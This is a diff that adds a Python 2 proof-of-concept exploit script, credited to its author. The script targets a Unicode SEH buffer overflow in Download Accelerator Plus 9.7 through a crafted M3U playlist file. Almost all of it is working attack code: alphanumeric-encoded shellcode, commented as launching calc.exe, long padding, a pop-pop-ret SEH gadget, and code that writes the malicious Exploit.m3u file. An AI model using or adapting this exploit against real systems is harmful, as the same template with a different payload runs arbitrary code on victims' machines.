@@ -1,0 +1,57 @@
+#!/usr/bin/python
+#
+#[+]Exploit Title: Download Accelarator plus(DAP) 9.7 M3U File Buffer Overflow Exploit(UNICODE-SEH)
+#[+]Date: 23\07\2011
+#[+]Author: C4SS!0 G0M3S
+#[+]Software Link: http://download.speedbit.com/dap97_baix.exe
+#[+]Version: 9.7
+#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
+#[+]CVE: N/A
+#
+#
+
+
+
+import os
+import sys
+from time import sleep
+ 
+if os.name == "nt":
+    os.system("cls")
+    os.system("color 4f")
+    os.system("Title Download Accelarator plus(DAP) 9.7 M3U File Buffer Overflow Exploit(UNICODE-SEH) ")
+else:
+    os.system("clear")
+
+print '''
+		
+		Download Accelarator plus(DAP) 9.7 M3U File Buffer Overflow Exploit(UNICODE-SEH) 
+		Created By C4SS!0 G0M3S
+		E-mail louredo_@hotmail.com
+		Blog net-fuzzer.blogspot.com
+		
+'''
+shellcode = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ"
+"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBYKWPNQGYWOCLLVRPHLJ9SDNDKD6QMNP"
+"X01D8N853K8KLM3SHQXKD55NP487LQUI92X6VNCJUKC7D6NSMKRVJNZ02MLWORBJMMMPT8U1VMYO1JGV" #Shellcode WinExec "Calc.exe"
+"61PL52QHJKVNUKEMD7W3LKKMKKU2KJPMWIMOXKMMROHMKURK8XCL7OK3JXOPLPOMS8S1CG4R7JWIHOKC"
+"STNE3MO0W0SQTPQ5QP3HMZUWVKEWQ3N5HZU5ZJQM5VHO6UIOMOKY0J9KN0Q31X6LNNO3ULYTGX7RXNOQ"
+"ITPCK8WM5COJH3KXJA")
+buf = ("\x41" * 14277)
+buf += ("\x41\x41")
+buf += ("\x79\x42") #0x00420079 : pop ebx # pop ecx # ret
+buf += ("\x55\x61\x55\x61\x55\x61\x55\x56\x55\x58\xc0\x55\x50\x55\xc3")
+buf += ("\x41" * 33)
+buf += shellcode
+
+print "\t\t[+]Creating File Exploit.m3u..."
+sleep(1)
+try:
+    f = open("Exploit.m3u","wb")
+    f.write("http://"+buf)
+    f.close()
+    print "\t\t[+]File Exploit.m3u Created."
+    sleep(2)
+except:
+    print "\t\t[-]Error in Create file Exploit.m3u"
+    sleep(1)
